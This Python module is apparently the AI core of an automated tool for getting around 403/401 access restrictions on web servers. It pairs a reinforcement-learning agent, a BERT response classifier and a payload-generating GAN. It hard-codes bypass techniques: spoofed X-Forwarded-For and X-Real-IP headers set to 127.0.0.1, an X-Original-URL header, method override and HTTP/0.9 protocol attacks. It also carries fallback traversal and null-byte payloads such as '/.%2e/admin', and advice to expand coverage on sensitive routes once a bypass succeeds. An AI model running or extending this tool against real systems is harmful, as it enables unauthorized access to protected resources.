
from __future__ import annotations
import os
import random
import logging
from typing import Dict, List, Optional, Any
import numpy as np
from .rl_agent import RLAgent, BypassEnvironment
from .bert_predictor import BERTPredictor
from .payload_gan import PayloadGAN

logger = logging.getLogger(__name__)

class AICore:
    def __init__(self, model_dir: str = "core/ai_core/models"):
        self.model_dir = model_dir
        self.bert_predictor = BERTPredictor(os.path.join(model_dir, "bert_model"))
        self.payload_gan = PayloadGAN(model_dir=model_dir)
        self.environment: Optional[BypassEnvironment] = None
        self.rl_agent: Optional[RLAgent] = None
        self._last_action_idx: Optional[int] = None
        self.persona: Dict[str, Any] = {}

    def set_seed(self, seed: int = 1337) -> None:
        random.seed(seed)
        np.random.seed(seed)
        try:
            import torch 
            torch.manual_seed(seed)
            if torch.cuda.is_available():
                torch.cuda.manual_seed_all(seed)
        except Exception as e:
            logger.debug(f"Could not seed torch RNGs: {e}")

    def set_persona(self, persona: Dict[str, Any]) -> None:
        self.persona = dict(persona or {})

    def initialize_rl_agent(self, target_profile: Dict) -> None:
        self.environment = BypassEnvironment(target_profile)
        action_size = len(self.environment.action_space)
        state_size = self.environment.state_size
        self.rl_agent = RLAgent(state_size, action_size, self.model_dir)
        logger.info(f"RL agent initialized (state_size={state_size}, action_size={action_size})")

    def get_next_action(self, response_history: List[Dict], target_info: Dict) -> Dict:
        if not self.environment or not self.rl_agent:
            return self.heuristic_action(response_history)

        try:
            state = self.environment.get_state(response_history, target_info)
            action_idx = self.rl_agent.act(state, training=True)
            self._last_action_idx = action_idx
            action = dict(self.environment.action_space[action_idx])
            action["ai_generated"] = True
            action["confidence"] = round(1.0 - float(self.rl_agent.epsilon), 3)
            if self.persona:
                action["persona"] = self.persona
            return action
        except Exception as e:
            logger.error(f"RL action selection failed: {e}")
            return self.heuristic_action(response_history)

    def heuristic_action(self, response_history: List[Dict]) -> Dict:
        if not response_history:
            return {"type": "path_trim", "intensity": 0.5, "ai_generated": False}

        last = response_history[-1]
        status = int(last.get("status_code", 0))

        if status == 403:
            candidates = [
                {"type": "header_injection", "header": "X-Original-URL", "ai_generated": False},
                {"type": "method_override", "method": "POST", "ai_generated": False},
                {"type": "protocol_attack", "protocol": "HTTP/0.9", "ai_generated": False},
            ]
            return random.choice(candidates)

        if status == 401:
            candidates = [
                {"type": "header_injection", "header": "X-Forwarded-For", "value": "127.0.0.1", "ai_generated": False},
                {"type": "header_injection", "header": "X-Real-IP", "value": "127.0.0.1", "ai_generated": False},
            ]
            return random.choice(candidates)

        return {"type": "path_trim", "intensity": round(random.uniform(0.1, 0.9), 2), "ai_generated": False}

    def analyze_response(self, response: Dict) -> Dict:
        """Run the BERT predictor over a normalized response dict."""
        label, confidence = self.bert_predictor.predict(response)
        return {
            "prediction": label,
            "confidence": float(confidence),
            "recommendation": self.get_recommendation(label, response),
        }

    def get_recommendation(self, prediction: str, response: Dict) -> str:
        recommendations = {
            "blocked": "Try alternate techniques (method override, header tricks) or increase intensity.",
            "bypass_possible": "Continue similar attempts; prioritize variants with minimal deltas.",
            "error": "Server-side error detected; protocol-level attacks may be promising.",
            "success": "Bypass confirmed — capture proofs and expand coverage on sensitive routes.",
        }
        return recommendations.get(prediction, "Continue with the current approach.")

    def generate_novel_payloads(self, num_payloads: int = 5) -> List[str]:
        try:
            return self.payload_gan.generate(n=num_payloads, persona=self.persona or None)
        except Exception as e:
            logger.debug(f"PayloadGAN generation failed, falling back: {e}")
            base = ["/;bypass", "/.%2e/admin", "/%2e%2e/admin", "/admin;debug", "/admin%00"]
            return base[: max(1, num_payloads)]

    def learn_from_experience(
        self,
        state: np.ndarray,
        action: int,
        reward: float,
        next_state: np.ndarray,
        done: bool,
    ) -> Optional[float]:

        if not self.rl_agent:
            return None

        try:
            self.rl_agent.remember(state, int(action), float(reward), next_state, bool(done))
            loss = self.rl_agent.replay()
            if self.rl_agent.steps % 100 == 0:
                self.rl_agent.save_model()
            return loss
        except Exception as e:
            logger.error(f"RL learn_from_experience failed: {e}")
            return None


    def train_models(self, training_data: Dict) -> None:
        if "response_data" in training_data and "response_labels" in training_data:
            logger.info("Training BERT model...")
            dataset_path = os.path.join(self.model_dir, "training_data.csv")
            self.bert_predictor.prepare_dataset(
                training_data["response_data"],
                training_data["response_labels"],
                dataset_path,
            )
            self.bert_predictor.train(dataset_path)
            
        if "payload_data" in training_data:
            try:
                logger.info("Training PayloadGAN...")
                self.payload_gan.train(training_data["payload_data"])
            except Exception as e:
                logger.error(f"PayloadGAN training failed: {e}")

        if "experience_data" in training_data and self.rl_agent:
            logger.info("Training RL agent from offline experience...")
            for exp in training_data["experience_data"]:
                try:
                    self.rl_agent.remember(
                        np.array(exp["state"], dtype=float),
                        int(exp["action"]),
                        float(exp["reward"]),
                        np.array(exp["next_state"], dtype=float),
                        bool(exp["done"]),
                    )
                except KeyError as ke:
                    logger.debug(f"Skipping malformed experience: missing {ke}")
                    continue

            for _ in range(100):
                self.rl_agent.replay()
            self.rl_agent.save_model()

    def get_status(self) -> Dict:
        status = {
            "bert_loaded": bool(self.bert_predictor.model is not None),
            "gan_loaded": bool(getattr(self.payload_gan, "char2idx", None) is not None),
            "rl_loaded": bool(self.rl_agent is not None),
        }
        if self.rl_agent:
            status.update(self.rl_agent.get_stats())
        if self.persona:
            status["persona"] = self.persona
        return status
